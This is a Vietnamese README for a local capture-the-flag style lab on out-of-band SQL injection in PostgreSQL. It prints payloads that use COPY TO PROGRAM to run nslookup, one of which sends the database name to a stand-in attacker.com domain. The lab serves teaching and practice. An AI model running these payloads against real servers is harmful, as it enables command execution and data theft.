# SQLi-041: PostgreSQL OOB DNS via COPY TO PROGRAM

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên PostgreSQL bằng `COPY TO PROGRAM` để thực thi `nslookup` và trigger DNS lookup.

## 📝 Mô Tả

**Scenario:** PostgreSQL server với superuser access. Stacked queries được hỗ trợ.

**URL:** `http://localhost:5041/user?id=1`

## 🎓 Kỹ Thuật

```sql
-- COPY TO PROGRAM với nslookup
COPY (SELECT '') TO PROGRAM 'nslookup data.attacker.com'

-- Với data exfiltration
COPY (SELECT current_database()) TO PROGRAM 'xargs -I{} nslookup {}.attacker.com'
```

**Yêu cầu:** PostgreSQL superuser

## 🚀 Run Lab

```bash
docker-compose up -d
curl http://localhost:5041/user?id=1
```

## 💡 Hints

1. PostgreSQL hỗ trợ stacked queries
2. COPY TO PROGRAM yêu cầu superuser
3. Dùng `nslookup` hoặc `dig` để trigger DNS

## 🏁 Flag: `FLAG{...}`
